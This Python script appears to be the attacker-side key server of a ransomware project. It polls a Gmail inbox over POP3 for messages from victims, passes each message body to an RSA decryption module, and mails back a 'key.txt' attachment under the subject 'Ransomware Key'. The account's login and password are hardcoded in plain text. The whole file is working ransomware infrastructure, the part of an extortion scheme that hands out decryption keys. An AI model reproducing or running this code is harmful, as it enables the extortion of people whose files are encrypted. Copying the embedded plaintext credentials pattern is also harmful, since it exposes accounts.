import smtplib
import poplib
from email import parser
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import Attacker.decrypt_rsa as decrypt

def parse_id(obj):
    eid = ""
    start = end = 0
    for i in range(len(obj)):
        if obj[i] == '<':
            start = i + 1
        if obj[i] == '>':
            end = i
    return obj[start:end]


def send_mail(toaddr, content):
    fromaddr = 'irritatingdoggo@gmail.com'
    password = 'annoyingdog'

    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Ransomware Key"

    body = content

    msg.attach(MIMEText(body, 'plain'))

    filename = "key.txt"
    attachment = open(filename, "rb")

    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, password)
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()


def parse_email(message):
    if message.is_multipart():
        for part in message.walk():
            ctype = part.get_content_type()
            cdispo = str(part.get('Content-Disposition'))
            body = part.get_payload(decode=True)

    # not multipart - i.e. plain text, no attachments, keeping fingers crossed
    else:
        body = message.get_payload(decode=True)
    return message['From'], body.rstrip()


pop_conn = poplib.POP3_SSL('pop.gmail.com')
pop_conn.user('irritatingdoggo@gmail.com')
pop_conn.pass_('annoyingdog')
# Get messages from server:
messages = [pop_conn.retr(i) for i in range(1, len(pop_conn.list()[1]) + 1)]
# Concat message pieces:
messages = ["\n".join([x.decode("utf-8") for x in mssg[1]]) for mssg in messages]
# Parse message intom an email object:
messages = [parser.Parser().parsestr(mssg) for mssg in messages]
for message in messages:
    email_id, body = parse_email(message)
    with open("attachment.txt", "wb") as f:
        f.write(body)
    decrypt.create_attachment("attachment.txt")
    send_mail(parse_id(email_id), "Your key is random")
pop_conn.quit()
